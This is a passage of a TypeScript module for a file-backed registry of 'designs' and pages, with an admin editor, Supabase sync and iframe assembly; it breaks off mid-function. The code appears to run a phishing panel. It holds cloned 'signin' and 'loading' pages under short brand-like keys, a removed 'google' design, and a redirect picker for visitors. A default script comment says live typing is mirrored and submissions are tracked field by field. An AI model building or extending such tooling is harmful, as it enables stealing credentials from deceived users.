// File-backed dynamic registry of designs + pages.
//
// Content lives as REAL files under src/designs/<design>/ — bundled into the
// app via Vite glob imports so the first paint is synchronous (no flicker).
// Edits in the admin Pages tab call a server function that rewrites the file
// on disk (works in `vite dev`); the in-memory override layer makes the new
// content visible immediately to the editor and the /view page.

import {
  deleteDesignFolder,
  deleteDesignPage,
  renameDesignFolder,
  renameDesignPageFile,
  writeDesignFile,
  writeDesignIndex,
  writeDesignMeta,
} from "@/lib/designFs.functions";
import { supabase } from "@/integrations/supabase/client";

// ---- Types (kept compatible with previous callers) ----

export type DesignKey = string;
export type PageKey = string;
export type PageSlot = string; // "<page>" or "shared"
export type FileKind = "html" | "css" | "js";

export type DesignFile = {
  design: DesignKey;
  page: PageSlot;
  kind: FileKind;
};

export type DesignRecord = {
  id: string;
  label: string;
  sort_order: number;
};

export type PageRecord = {
  design: string;
  page: string;
  label: string | null;
};

// ---- Bundled file content (Vite eager glob, ?raw) ----

type RawMap = Record<string, string>;
const HTML_FILES = import.meta.glob("/src/designs/*/*.html", {
  query: "?raw",
  import: "default",
  eager: true,
}) as RawMap;
const CSS_FILES = import.meta.glob("/src/designs/*/*.css", {
  query: "?raw",
  import: "default",
  eager: true,
}) as RawMap;
const JS_FILES = import.meta.glob("/src/designs/*/*.js", {
  query: "?raw",
  import: "default",
  eager: true,
}) as RawMap;
const META_FILES = import.meta.glob("/src/designs/*/_meta.json", {
  import: "default",
  eager: true,
}) as Record<
  string,
  {
    label: string;
    pages: Record<string, string>;
    pageMeta?: Record<string, { title?: string; favicon?: string }>;
  }
>;
const INDEX_FILE = import.meta.glob("/src/designs/_index.json", {
  import: "default",
  eager: true,
}) as Record<string, { order: string[] }>;
const PNG_FILES = import.meta.glob("/src/designs/*/*.png", {
  query: "?url",
  import: "default",
  eager: true,
}) as Record<string, string>;

const BUNDLED_INDEX: { order: string[] } =
  Object.values(INDEX_FILE)[0] ?? { order: [] };

// ---- Mutable runtime state (overrides on top of bundled files) ----

const OVERRIDE_PREFIX = "design_override:";
const META_PREFIX = "design_meta_override:";
const INDEX_KEY = "design_index_override";
const HIDDEN_DESIGNS_KEY = "design_hidden_bundled";
const TOMBSTONE_KEY = "design_tombstones";

export type PageMeta = { title?: string; favicon?: string; hidden?: boolean; icon?: string };
type MetaEntry = {
  label: string;
  pages: Record<string, string>;
  pageMeta: Record<string, PageMeta>;
  hiddenShared?: { css?: boolean; js?: boolean };
};


const _contentOverrides = new Map<string, string>(); // key = design:page:kind
const _metaOverrides = new Map<string, MetaEntry>(); // key = design
const _hiddenBundledDesigns = new Set<string>();
const _tombstones = new Set<string>(); // key = design:page:kind — never resurrect
let _indexOverride: { order: string[] } | null = null;

/** Only these designs ship / appear in the admin Pages tree + redirect picker. */
const ALLOWED_DESIGNS = new Set(["cb", "gi", "ge"]);
const REMOVED_DESIGNS = ["go", "blue", "red", "google"];

function persistTombstones() {
  if (typeof window === "undefined") return;
  try {
    window.localStorage.setItem(TOMBSTONE_KEY, JSON.stringify(Array.from(_tombstones)));
  } catch {
    /* ignore */
  }
}

export function getDesignLogo(design: string): string | null {
  const k = `/src/designs/${design}/logo.png`;
  if (PNG_FILES[k]) return PNG_FILES[k];
  // Fall back to any png in the folder
  const prefix = `/src/designs/${design}/`;
  for (const key of Object.keys(PNG_FILES)) {
    if (key.startsWith(prefix)) return PNG_FILES[key];
  }
  return null;
}

/** Favicon for a design page — per-page override, else the design logo. */
export function getDesignFavicon(design: string, page?: string): string | null {
  if (page) {
    const fromPage = (getPageMeta(design, page).favicon ?? "").trim();
    if (fromPage) return fromPage;
  }
  return getDesignLogo(design);
}

/** TanStack Router `head.links` entries for a design favicon. */
export function designFaviconLinks(design: string, page?: string) {
  const href = getDesignFavicon(design, page);
  if (!href) return [];
  return [{ rel: "icon", href, type: "image/png" as const }];
}

function lsLoad() {
  if (typeof window === "undefined") return;
  try {
    for (let i = 0; i < window.localStorage.length; i++) {
      const k = window.localStorage.key(i);
      if (!k) continue;
      if (k.startsWith(OVERRIDE_PREFIX)) {
        const v = window.localStorage.getItem(k);
        if (v != null) _contentOverrides.set(k.slice(OVERRIDE_PREFIX.length), v);
      } else if (k.startsWith(META_PREFIX)) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            const parsed = JSON.parse(v) as Partial<MetaEntry>;
            _metaOverrides.set(k.slice(META_PREFIX.length), {
              label: parsed.label ?? k.slice(META_PREFIX.length),
              pages: parsed.pages ?? {},
              pageMeta: parsed.pageMeta ?? {},
              hiddenShared: parsed.hiddenShared ?? {},
            });
          } catch {

            /* ignore */
          }
        }
      } else if (k === INDEX_KEY) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            _indexOverride = JSON.parse(v);
          } catch {
            /* ignore */
          }
        }
      } else if (k === HIDDEN_DESIGNS_KEY) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            for (const id of JSON.parse(v) as string[]) _hiddenBundledDesigns.add(id);
          } catch {
            /* ignore */
          }
        }
      } else if (k === TOMBSTONE_KEY) {
        const v = window.localStorage.getItem(k);
        if (v != null) {
          try {
            for (const id of JSON.parse(v) as string[]) _tombstones.add(id);
          } catch {
            /* ignore */
          }
        }
      }

    }
  } catch {
    /* ignore */
  }
}
lsLoad();
runMigrations();

function runMigrations() {
  if (typeof window === "undefined") return;
  const MIGRATION_KEY = "design_migration_v4";
  try {
    if (window.localStorage.getItem(MIGRATION_KEY) !== "1") {
    // Drop removed designs (go/blue/red/google) from any local overrides so
    // they never reappear in the Pages tree after a prior install.
    for (const d of REMOVED_DESIGNS) {
      _metaOverrides.delete(d);
      _hiddenBundledDesigns.add(d);
      try { window.localStorage.removeItem(META_PREFIX + d); } catch { /* ignore */ }
      for (const key of Array.from(_contentOverrides.keys())) {
        if (key.startsWith(`${d}:`)) {
          _contentOverrides.delete(key);
          try { window.localStorage.removeItem(OVERRIDE_PREFIX + key); } catch { /* ignore */ }
        }
      }
    }
    try {
      window.localStorage.setItem(
        HIDDEN_DESIGNS_KEY,
        JSON.stringify(Array.from(_hiddenBundledDesigns)),
      );
    } catch { /* ignore */ }
    if (_indexOverride) {
      _indexOverride = {
        order: _indexOverride.order.filter((id) => ALLOWED_DESIGNS.has(id)),
      };
      try {
        window.localStorage.setItem(INDEX_KEY, JSON.stringify(_indexOverride));
      } catch { /* ignore */ }
    }
    // Wipe stale meta + content overrides + tombstones for bundled designs that
    // were renamed (sign-in -> signin, signinaddon -> signinp).
    const stalePages = ["sign-in", "signinaddon", "signin-in", "signinp-addon"];
    const designsToClean = ["cb", "gi"];
    for (const d of designsToClean) {
      _metaOverrides.delete(d);
      try { window.localStorage.removeItem(META_PREFIX + d); } catch { /* ignore */ }
      for (const p of stalePages) {
        for (const kind of ["html", "css", "js"]) {
          const key = `${d}:${p}:${kind}`;
          _contentOverrides.delete(key);
          _tombstones.delete(key);
          try { window.localStorage.removeItem(OVERRIDE_PREFIX + key); } catch { /* ignore */ }
        }
      }
    }
    persistTombstones();
    try { window.localStorage.setItem(MIGRATION_KEY, "1"); } catch { /* ignore */ }
    }
  } catch {
    /* ignore */
  }

  // ge: drop placeholder overrides so bundled signin/loading HTML wins.
  const GE_MIG = "design_migration_ge_v1";
  try {
    if (window.localStorage.getItem(GE_MIG) !== "1") {
      for (const page of ["signin", "loading"]) {
        for (const kind of ["html", "css", "js"]) {
          const key = `ge:${page}:${kind}`;
          _contentOverrides.delete(key);
          _tombstones.delete(key);
          try { window.localStorage.removeItem(OVERRIDE_PREFIX + key); } catch { /* ignore */ }
        }
      }
      persistTombstones();
      try { window.localStorage.setItem(GE_MIG, "1"); } catch { /* ignore */ }
    }
  } catch {
    /* ignore */
  }
}

function lsSet(key: string, value: string) {
  if (typeof window === "undefined") return;
  try {
    window.localStorage.setItem(key, value);
  } catch {
    /* quota */
  }
}

function lsDel(key: string) {
  if (typeof window === "undefined") return;
  try {
    window.localStorage.removeItem(key);
  } catch {
    /* ignore */
  }
}

// ---- Listeners ----

type FileChangeListener = (f: DesignFile) => void;
const _registryListeners = new Set<() => void>();
const _fileListeners = new Set<FileChangeListener>();

export function subscribeRegistry(fn: () => void): () => void {
  _registryListeners.add(fn);
  return () => _registryListeners.delete(fn);
}

function notifyRegistry() {
  for (const l of _registryListeners) l();
}
function notifyFile(f: DesignFile) {
  for (const l of _fileListeners) l(f);
}

// Cross-tab sync via storage events
if (typeof window !== "undefined") {
  window.addEventListener("storage", (e) => {
    if (!e.key) return;
    if (e.key.startsWith(OVERRIDE_PREFIX)) {
      const id = e.key.slice(OVERRIDE_PREFIX.length);
      if (e.newValue == null) _contentOverrides.delete(id);
      else _contentOverrides.set(id, e.newValue);
      const [design, page, kind] = id.split(":");
      if (design && page && kind)
        notifyFile({
          design,
          page,
          kind: kind as FileKind,
        });
    } else if (e.key.startsWith(META_PREFIX)) {
      const id = e.key.slice(META_PREFIX.length);
      if (e.newValue == null) _metaOverrides.delete(id);
      else {
        try {
          _metaOverrides.set(id, JSON.parse(e.newValue));
        } catch {
          /* ignore */
        }
      }
      notifyRegistry();
    } else if (e.key === INDEX_KEY) {
      if (e.newValue == null) _indexOverride = null;
      else {
        try {
          _indexOverride = JSON.parse(e.newValue);
        } catch {
          /* ignore */
        }
      }
      notifyRegistry();
    } else if (e.key === HIDDEN_DESIGNS_KEY) {
      _hiddenBundledDesigns.clear();
      if (e.newValue) {
        try {
          for (const id of JSON.parse(e.newValue) as string[]) _hiddenBundledDesigns.add(id);
        } catch {
          /* ignore */
        }
      }
      notifyRegistry();
    }
  });
}

// ---- Helpers ----

function fileBundleKey(f: DesignFile): string {
  if (f.kind === "html") return `/src/designs/${f.design}/${f.page}.html`;
  if (f.kind === "css")
    return f.page === "shared"
      ? `/src/designs/${f.design}/shared.css`
      : `/src/designs/${f.design}/${f.page}.css`;
  return f.page === "shared"
    ? `/src/designs/${f.design}/shared.js`
    : `/src/designs/${f.design}/${f.page}.js`;
}

function bundledContent(f: DesignFile): string | null {
  const k = fileBundleKey(f);
  if (f.kind === "html") return HTML_FILES[k] ?? null;
  if (f.kind === "css") return CSS_FILES[k] ?? null;
  return JS_FILES[k] ?? null;
}

function metaFor(designId: string): MetaEntry {
  const override = _metaOverrides.get(designId);
  const bundledRaw =
    META_FILES[`/src/designs/${designId}/_meta.json`];
  const bundled = bundledRaw
    ? {
        label: bundledRaw.label ?? designId,
        pages: { ...bundledRaw.pages },
        pageMeta: { ...(bundledRaw.pageMeta ?? {}) },
        hiddenShared: {} as { css?: boolean; js?: boolean },
      }
    : null;
  if (override && bundled) {
    // Bundled labels win for bundled pages; keep override-only pages, pageMeta, hiddenShared.
    const mergedPages: Record<string, string> = { ...override.pages, ...bundled.pages };
    return {
      label: bundled.label,
      pages: mergedPages,
      pageMeta: { ...bundled.pageMeta, ...override.pageMeta },
      hiddenShared: override.hiddenShared ?? {},
    };
  }
  if (override) return override;
  if (bundled) return bundled;
  return { label: designId, pages: {}, pageMeta: {}, hiddenShared: {} };
}


export function getHiddenShared(design: string): { css?: boolean; js?: boolean } {
  return metaFor(design).hiddenShared ?? {};
}

export async function setSharedHidden(
  design: string,
  kind: "css" | "js",
  hidden: boolean,
): Promise<void> {
  const meta = metaFor(design);
  const next: MetaEntry = {
    ...meta,
    hiddenShared: { ...(meta.hiddenShared ?? {}), [kind]: hidden || undefined },
  };
  _metaOverrides.set(design, next);
  lsSet(META_PREFIX + design, JSON.stringify(next));
  // If hiding, also clear any content override AND tombstone so the bundled
  // file never reappears (and so remote rows don't resurrect it).
  const key = `${design}:shared:${kind}`;
  if (hidden) {
    _contentOverrides.delete(key);
    lsDel(OVERRIDE_PREFIX + key);
    _tombstones.add(key);
    persistTombstones();
    try { await supabase.from("design_pages").delete().match({ design, page: "shared", kind }); } catch { /* ignore */ }
  } else {
    _tombstones.delete(key);
    persistTombstones();
  }
  notifyRegistry();
  notifyFile({ design, page: "shared", kind });
  await persistMeta(design);
}

export function getPageMeta(design: string, page: string): PageMeta {
  return metaFor(design).pageMeta[page] ?? {};
}

export async function setPageMeta(
  design: string,
  page: string,
  patch: PageMeta,
): Promise<void> {
  const meta = metaFor(design);
  const nextPageMeta = {
    ...meta.pageMeta,
    [page]: { ...(meta.pageMeta[page] ?? {}), ...patch },
  };
  // Drop empties so the meta file stays clean.
  const cleaned: Record<string, PageMeta> = {};
  for (const [k, v] of Object.entries(nextPageMeta)) {
    const t = (v.title ?? "").trim();
    const f = (v.favicon ?? "").trim();
    const ic = (v.icon ?? "").trim();
    const h = !!v.hidden;
    if (t || f || h || ic)
      cleaned[k] = {
        ...(t ? { title: t } : {}),
        ...(f ? { favicon: f } : {}),
        ...(h ? { hidden: true } : {}),
        ...(ic ? { icon: ic } : {}),
      };
  }
  const next: MetaEntry = { label: meta.label, pages: meta.pages, pageMeta: cleaned, hiddenShared: meta.hiddenShared };
  _metaOverrides.set(design, next);
  lsSet(META_PREFIX + design, JSON.stringify(next));
  notifyRegistry();
  // Re-render any open iframe for this page.
  notifyFile({ design, page, kind: "html" });
  await persistMeta(design);
}

export function getPageIcon(design: string, page: string): string | null {
  return metaFor(design).pageMeta[page]?.icon ?? null;
}

export async function setPageIcon(design: string, page: string, url: string | null): Promise<void> {
  await setPageMeta(design, page, { icon: url ?? "" });
}



function currentIndex(): { order: string[] } {
  if (_indexOverride) return _indexOverride;
  return BUNDLED_INDEX;
}

// ---- Public registry accessors ----

export function getDesigns(): DesignRecord[] {
  const order = currentIndex().order.filter(
    (id) => ALLOWED_DESIGNS.has(id) && !_hiddenBundledDesigns.has(id),
  );
  // Include any allowed design that has a meta override or a bundled meta but
  // isn't in the index (defensive). Never surface removed designs (go/blue/red).
  const seen = new Set(order);
  for (const k of Object.keys(META_FILES)) {
    const id = k.split("/")[3];
    if (
      id &&
      ALLOWED_DESIGNS.has(id) &&
      !seen.has(id) &&
      !_hiddenBundledDesigns.has(id)
    ) {
      order.push(id);
      seen.add(id);
    }
  }
  for (const id of _metaOverrides.keys()) {
    if (ALLOWED_DESIGNS.has(id) && !seen.has(id) && !_hiddenBundledDesigns.has(id)) {
      order.push(id);
      seen.add(id);
    }
  }
  return order.map((id, i) => ({
    id,
    label: metaFor(id).label,
    sort_order: i,
  }));
}

export function getPagesFor(design: string): PageRecord[] {
  const meta = metaFor(design);
  const out: PageRecord[] = Object.entries(meta.pages)
    .filter(([page]) => !_tombstones.has(`${design}:${page}:html`))
    .map(([page, label]) => ({ design, page, label }));
  const seen = new Set(out.map((p) => p.page));
  const prefix = `/src/designs/${design}/`;
  for (const k of Object.keys(HTML_FILES)) {
    if (!k.startsWith(prefix)) continue;
    const file = k.slice(prefix.length);
    if (!file.endsWith(".html")) continue;
    const page = file.slice(0, -5);
    if (page === "shared" || seen.has(page)) continue;
    if (_tombstones.has(`${design}:${page}:html`)) continue;
    seen.add(page);
    out.push({ design, page, label: page });
  }
  for (const key of _contentOverrides.keys()) {
    const [d, p, k] = key.split(":");
    if (d !== design || k !== "html" || p === "shared" || seen.has(p)) continue;
    if (_tombstones.has(`${design}:${p}:html`)) continue;
    seen.add(p);
    out.push({ design, page: p, label: p });
  }
  return out;
}

// Pages shown in the redirect picker — excludes pages with `hidden: true`.
export function getRedirectPages(design: string): PageRecord[] {
  const meta = metaFor(design);
  return getPagesFor(design).filter((p) => !meta.pageMeta[p.page]?.hidden);
}

export function isPageHidden(design: string, page: string): boolean {
  return !!metaFor(design).pageMeta[page]?.hidden;
}

export async function setPageHidden(design: string, page: string, hidden: boolean): Promise<void> {
  await setPageMeta(design, page, { hidden });
}

export function getDesignLabel(id: string): string {
  return metaFor(id).label;
}

export function getPageLabel(design: string, page: string): string {
  return metaFor(design).pages[page] ?? page;
}


// ---- Defaults for new files ----

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function defaultHTML(label: string): string {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>${escapeHtml(label)}</title>
</head>
<body>
  <main style="font-family:ui-sans-serif,system-ui,sans-serif;padding:40px;max-width:720px;margin:0 auto;">
    <h1 style="margin:0 0 12px;">${escapeHtml(label)}</h1>
    <p style="color:#666;">Edit this page from the admin Pages tab.</p>
  </main>
</body>
</html>`;
}

function defaultCSS(): string {
  return `/* Shared styles for this design. */
*{box-sizing:border-box}
body{margin:0;background:#fafafa;color:#111;font-family:ui-sans-serif,system-ui,sans-serif}
`;
}

function defaultJS(): string {
  return `// Shared script. Use track(field,value) for final submissions only.
// Live typing is mirrored automatically — do not track() on every keystroke.
`;
}

const DEFAULT_LOADING_HTML = `<!DOCTYPE html>
<html lang="en" style="background-color:rgb(10,11,13);">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loading…</title>
  <style>
    html, body { margin: 0; height: 100%; background: rgb(10,11,13); }
    .wrap { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; }
    .logo { width: 64px; height: 64px; transform-origin: 50% 50%; animation: spin-osc 1.8s cubic-bezier(0.65, 0, 0.35, 1) infinite; }
    @keyframes spin-osc { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="wrap">
    <svg class="logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"></path>
    </svg>
  </div>
</body>
</html>`;

export function defaultContent(f: DesignFile): string {
  if (f.kind === "css") return defaultCSS();
  if (f.kind === "js") return defaultJS();
  const label = f.page === "shared" ? "Page" : getPageLabel(f.design, f.page);
  return defaultHTML(label);
}

// ---- File read/write ----

function overrideKey(f: DesignFile): string {
  return `${f.design}:${f.page}:${f.kind}`;
}

export function loadFileCached(f: DesignFile): string {
  const key = overrideKey(f);
  // Tombstoned files stay deleted — never resurrect from bundled or defaults.
  if (_tombstones.has(key)) return "";
  if (f.page === "shared" && (f.kind === "css" || f.kind === "js")) {
    const hidden = getHiddenShared(f.design)[f.kind];
    if (hidden) return "";
  }
  const ov = _contentOverrides.get(key);
  if (ov != null) return ov;
  const b = bundledContent(f);
  if (b != null) return b;
  return defaultContent(f);
}


// Kept for compatibility with the existing editor — same as cached read.
export async function loadFile(f: DesignFile): Promise<string> {
  return loadFileCached(f);
}

export async function saveFile(f: DesignFile, content: string): Promise<void> {
  const key = overrideKey(f);
  // Saving clears any tombstone for this file.
  if (_tombstones.delete(key)) persistTombstones();
  _contentOverrides.set(key, content);
  lsSet(OVERRIDE_PREFIX + key, content);
  // If this is a shared file that was hidden, un-hide it.
  if (f.page === "shared" && (f.kind === "css" || f.kind === "js")) {
    const hs = getHiddenShared(f.design);
    if (hs[f.kind]) {
      const meta = metaFor(f.design);
      const next: MetaEntry = {
        ...meta,
        hiddenShared: { ...(meta.hiddenShared ?? {}), [f.kind]: undefined },
      };
      _metaOverrides.set(f.design, next);
      lsSet(META_PREFIX + f.design, JSON.stringify(next));
      notifyRegistry();
    }
  }
  notifyFile(f);
  try {
    await supabase
      .from("design_pages")
      .upsert(
        { design: f.design, page: f.page, kind: f.kind, content },
        { onConflict: "design,page,kind" },
      );
  } catch {
    /* ignore */
  }
  try {
    await writeDesignFile({
      data: { design: f.design, page: f.page, kind: f.kind, content },
    });
  } catch {
    /* readonly FS in prod */
  }
}

// Reset = revert to whatever is currently on disk (bundled). Does NOT rewrite
// files — the user's source files are the source of truth.
export async function resetFile(f: DesignFile): Promise<void> {
  const key = overrideKey(f);
  _contentOverrides.delete(key);
  lsDel(OVERRIDE_PREFIX + key);
  if (_tombstones.delete(key)) persistTombstones();
  try {
    await supabase.from("design_pages").delete().match({
      design: f.design, page: f.page, kind: f.kind,
    });
  } catch {
    /* ignore */
  }
  notifyFile(f);
}


// ---- Registry mutations ----

const SLUG_RE = /^[a-z][a-z0-9_-]{0,30}$/;
const PAGE_SLUG_RE = /^[a-z][a-z0-9_-]{0,40}$/;

export function slugify(s: string, max = 30): string {
  const base = s
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, max);
  return base || "x";
}

async function persistMeta(designId: string) {
  const meta = metaFor(designId);
  _metaOverrides.set(designId, meta);
  lsSet(META_PREFIX + designId, JSON.stringify(meta));
  notifyRegistry();
  try {
    await writeDesignMeta({
      data: {
        design: designId,
        label: meta.label,
        pages: meta.pages,
        pageMeta: meta.pageMeta,
        hiddenShared: meta.hiddenShared,
      },
    });

  } catch {
    /* ignore */
  }
}

async function persistIndex() {
  const order = getDesigns().map((d) => d.id);
  _indexOverride = { order };
  lsSet(INDEX_KEY, JSON.stringify(_indexOverride));
  notifyRegistry();
  try {
    await writeDesignIndex({ data: { order } });
  } catch {
    /* ignore */
  }
}

function hideBundledDesign(id: string) {
  _hiddenBundledDesigns.add(id);
  lsSet(HIDDEN_DESIGNS_KEY, JSON.stringify(Array.from(_hiddenBundledDesigns)));
}

function unhideBundledDesign(id: string) {
  if (!_hiddenBundledDesigns.delete(id)) return;
  lsSet(HIDDEN_DESIGNS_KEY, JSON.stringify(Array.from(_hiddenBundledDesigns)));
}

export async function createDesign(
  id: string,
  label: string,
): Promise<DesignRecord> {
  if (!SLUG_RE.test(id)) throw new Error("Invalid design id");
  if (getDesigns().some((d) => d.id === id))
    throw new Error("Design already exists");
  unhideBundledDesign(id);
  const trimmed = label.trim() || id;
  // Empty design — no seed pages, no shared files. The user adds what they want.
  _metaOverrides.set(id, { label: trimmed, pages: {}, pageMeta: {} });
  lsSet(
    META_PREFIX + id,
    JSON.stringify({ label: trimmed, pages: {}, pageMeta: {} }),
  );
  await persistMeta(id);
  await persistIndex();
  return { id, label: trimmed, sort_order: getDesigns().length };
}


export async function renameDesign(id: string, label: string): Promise<string> {
  const trimmed = label.trim();
  if (!trimmed) throw new Error("Label required");
  const nextId = slugify(trimmed);
  if (!SLUG_RE.test(nextId)) throw new Error("Invalid design id");
  if (nextId !== id && getDesigns().some((d) => d.id === nextId)) {
    throw new Error("A design with that link already exists");
  }
  const meta = metaFor(id);
  const nextMeta = { label: trimmed, pages: { ...meta.pages }, pageMeta: { ...meta.pageMeta } };

  if (nextId !== id) {
    for (const page of Object.keys(meta.pages)) {
      const html = loadFileCached({ design: id, page, kind: "html" });
      _contentOverrides.set(`${nextId}:${page}:html`, html);
      lsSet(OVERRIDE_PREFIX + `${nextId}:${page}:html`, html);
      _contentOverrides.delete(`${id}:${page}:html`);
      lsDel(OVERRIDE_PREFIX + `${id}:${page}:html`);
    }
    for (const kind of ["css", "js"] as FileKind[]) {
      const content = loadFileCached({ design: id, page: "shared", kind });
      _contentOverrides.set(`${nextId}:shared:${kind}`, content);
      lsSet(OVERRIDE_PREFIX + `${nextId}:shared:${kind}`, content);
      _contentOverrides.delete(`${id}:shared:${kind}`);
      lsDel(OVERRIDE_PREFIX + `${id}:shared:${kind}`);
    }

    _metaOverrides.delete(id);
    lsDel(META_PREFIX + id);
    hideBundledDesign(id);
    _metaOverrides.set(nextId, nextMeta);
    lsSet(META_PREFIX + nextId, JSON.stringify(nextMeta));

    const order = currentIndex().order.map((x) => (x === id ? nextId : x));
    _indexOverride = { order };
    lsSet(INDEX_KEY, JSON.stringify(_indexOverride));

    notifyRegistry();
    for (const page of Object.keys(meta.pages)) notifyFile({ design: nextId, page, kind: "html" });
    notifyFile({ design: nextId, page: "shared", kind: "css" });
    notifyFile({ design: nextId, page: "shared", kind: "js" });
    try {
      await renameDesignFolder({ data: { from: id, to: nextId } });
    } catch {
      /* ignore */
    }
    await persistMeta(nextId);
    await persistIndex();
    return nextId;
  }

  _metaOverrides.set(id, nextMeta);
  lsSet(
    META_PREFIX + id,
    JSON.stringify(nextMeta),
  );

  notifyRegistry();
  await persistMeta(id);
  return id;
}

export async function deleteDesign(id: string): Promise<void> {
  // Clear overrides for every file under this design
  const prefix = `${id}:`;
  for (const key of Array.from(_contentOverrides.keys())) {
    if (key.startsWith(prefix)) {
      _contentOverrides.delete(key);
      lsDel(OVERRIDE_PREFIX + key);
    }
  }
  _metaOverrides.delete(id);
  lsDel(META_PREFIX + id);
  hideBundledDesign(id);
  const order = currentIndex().order.filter((x) => x !== id);
  _indexOverride = { order };
  lsSet(INDEX_KEY, JSON.stringify(_indexOverride));
  notifyRegistry();
  try {
    await deleteDesignFolder({ data: { design: id } });
  } catch {
    /* ignore */
  }
  await persistIndex();
}

export async function createPage(
  design: string,
  page: string,
  label?: string,
): Promise<void> {
  if (!PAGE_SLUG_RE.test(page)) throw new Error("Invalid page id");
  if (page === "shared") throw new Error("'shared' is reserved");
  const display = (label ?? page).trim() || page;
  const meta = metaFor(design);
  const nextPages = { ...meta.pages, [page]: display };
  _metaOverrides.set(design, { label: meta.label, pages: nextPages, pageMeta: meta.pageMeta });
  lsSet(
    META_PREFIX + design,
    JSON.stringify({ label: meta.label, pages: nextPages, pageMeta: meta.pageMeta }),
  );

  notifyRegistry();
  await saveFile(
    { design, page, kind: "html" },
    defaultHTML(`${meta.label} — ${display}`),
  );
  await persistMeta(design);
}

export async function renamePage(
  design: string,
  page: string,
  label: string,
): Promise<string> {
  const trimmed = label.trim();
  if (!trimmed) throw new Error("Label required");
  const nextPage = slugify(trimmed, 40);
  if (!PAGE_SLUG_RE.test(nextPage)) throw new Error("Invalid page id");
  if (nextPage === "shared") throw new Error("'shared' is reserved");
  const meta = metaFor(design);
  if (!(page in meta.pages)) throw new Error("Page not found");
  if (nextPage !== page && nextPage in meta.pages) {
    throw new Error("A page with that link already exists");
  }
  const nextPages = { ...meta.pages };
  const nextPageMeta = { ...meta.pageMeta };
  if (nextPage !== page) {
    delete nextPages[page];
    nextPages[nextPage] = trimmed;
    if (nextPageMeta[page]) {
      nextPageMeta[nextPage] = nextPageMeta[page];
      delete nextPageMeta[page];
    }
    const oldKey = `${design}:${page}:html`;
    const newKey = `${design}:${nextPage}:html`;
    const html = loadFileCached({ design, page, kind: "html" });
    _contentOverrides.set(newKey, html);
    lsSet(OVERRIDE_PREFIX + newKey, html);
    _contentOverrides.delete(oldKey);
    lsDel(OVERRIDE_PREFIX + oldKey);
  } else {
    nextPages[page] = trimmed;
  }

  _metaOverrides.set(design, { label: meta.label, pages: nextPages, pageMeta: nextPageMeta });
  lsSet(
    META_PREFIX + design,
    JSON.stringify({ label: meta.label, pages: nextPages, pageMeta: nextPageMeta }),
  );

  notifyRegistry();
  if (nextPage !== page) {
    notifyFile({ design, page: nextPage, kind: "html" });
    try {
      await renameDesignPageFile({ data: { design, from: page, to: nextPage } });
    } catch {
      /* ignore */
    }
  }
  await persistMeta(design);
  return nextPage;
}

export async function deletePage(design: string, page: string): Promise<void> {
  const meta = metaFor(design);
  const nextPages = { ...meta.pages };
  delete nextPages[page];
  const nextPageMeta = { ...meta.pageMeta };
  delete nextPageMeta[page];
  _metaOverrides.set(design, { label: meta.label, pages: nextPages, pageMeta: nextPageMeta });
  lsSet(
    META_PREFIX + design,
    JSON.stringify({ label: meta.label, pages: nextPages, pageMeta: nextPageMeta }),
  );

  // Drop content override + tombstone so the bundled .html cannot resurrect it.
  const key = `${design}:${page}:html`;
  _contentOverrides.delete(key);
  lsDel(OVERRIDE_PREFIX + key);
  _tombstones.add(key);
  persistTombstones();
  notifyRegistry();
  try { await supabase.from("design_pages").delete().match({ design, page, kind: "html" }); } catch { /* ignore */ }
  try {
    await deleteDesignPage({ data: { design, page } });
  } catch {
    /* ignore */
  }
  await persistMeta(design);
}


// ---- Bulk loader (no-op — kept for API compat) ----

export async function loadAll(): Promise<void> {
  // Everything is loaded synchronously from bundled files at import time.
  // This stub exists only so legacy callers (which `await loadAll()`) keep
  // working without an extra round-trip.
}

// ---- Iframe document assembly ----

export function buildSrcDocCached(design: DesignKey, page: PageKey): string {
  const html = loadFileCached({ design, page, kind: "html" });
  const css = loadFileCached({ design, page: "shared", kind: "css" });
  const js = loadFileCached({ design, page: "shared", kind: "js" });
  const pm = getPageMeta(design, page);
  const trimmed = html.trimStart().toLowerCase();
  const isFullDoc =
    trimmed.startsWith("<!doctype") || trimmed.startsWith("<html");
  const base = isFullDoc ? injectTracker(html) : wrap(html, css, js);
  return applyPageMeta(base, pm, design);
}

export function buildSrcDocVirtual(
  design: DesignKey,
  loadPage: PageKey,
  virtualPage: PageKey,
): string {
  const doc = buildSrcDocCached(design, loadPage);
  const inject = `<script>window.__ux_virtual_page=${JSON.stringify(virtualPage)};</script>`;
  if (/<head[^>]*>/i.test(doc)) {
    return doc.replace(/<head[^>]*>/i, (m) => `${m}\n${inject}`);
  }
  return inject + doc;
}

function escAttr(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");
}

function escText(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function applyPageMeta(doc: string, pm: PageMeta, design?: DesignKey): string {
  let out = doc;
  const title = (pm.title ?? "").trim();
  const favicon =
    (pm.favicon ?? "").trim() ||
    (design ? getDesignLogo(design) : null) ||
    "";
  if (!title && !favicon) return out;

  if (title) {
    if (/<title>[\s\S]*?<\/title>/i.test(out)) {
      out = out.replace(/<title>[\s\S]*?<\/title>/i, `<title>${escText(title)}</title>`);
    } else if (/<head[^>]*>/i.test(out)) {
